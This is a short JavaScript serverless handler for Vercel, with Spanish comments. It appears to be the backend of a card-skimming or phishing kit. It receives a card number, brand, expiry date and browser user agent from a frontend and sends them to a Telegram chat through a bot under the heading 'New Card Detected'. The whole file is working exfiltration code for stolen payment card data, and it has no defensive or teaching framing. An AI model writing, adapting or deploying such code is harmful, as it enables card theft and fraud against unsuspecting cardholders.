export default async function handler(req, res) {
  // Solo permitimos peticiones POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  // Recibimos los datos limpios desde tu frontend
  const { numero, marca, exp, userAgent } = req.body;

  // Llamamos a las variables seguras de Vercel
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  const text = `💳 *Nueva Tarjeta Detectada*\n\n` +
               `▫️ *Número:* \`${numero}\`\n` +
               `▫️ *Marca:* ${marca}\n` +
               `▫️ *Exp:* ${exp}\n` +
               `▫️ *User-Agent:* ${userAgent}`;

  try {
    // El servidor hace la petición a Telegram, no el navegador
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) throw new Error('Error en la API de Telegram');
    
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: 'Error interno del servidor' });
  }
}
